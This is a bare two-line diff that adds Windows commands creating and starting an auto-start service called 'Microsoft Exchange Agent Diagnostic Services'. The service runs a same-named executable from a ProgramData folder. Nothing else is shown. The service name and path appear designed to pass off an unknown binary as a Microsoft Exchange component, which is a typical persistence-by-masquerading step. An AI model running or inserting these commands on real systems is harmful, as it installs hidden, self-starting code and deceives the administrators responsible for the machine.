@@ -1,0 +1,2 @@
+sc create "Microsoft Exchange Agent Diagnostic Services" binpath= "C:\\ProgramData\\Microsoft\\Diagnostic\\Microsoft Exchange Agent Diagnostic Services.exe" start= auto 2>&1
+sc start "Microsoft Exchange Agent Diagnostic Services" 2>&1
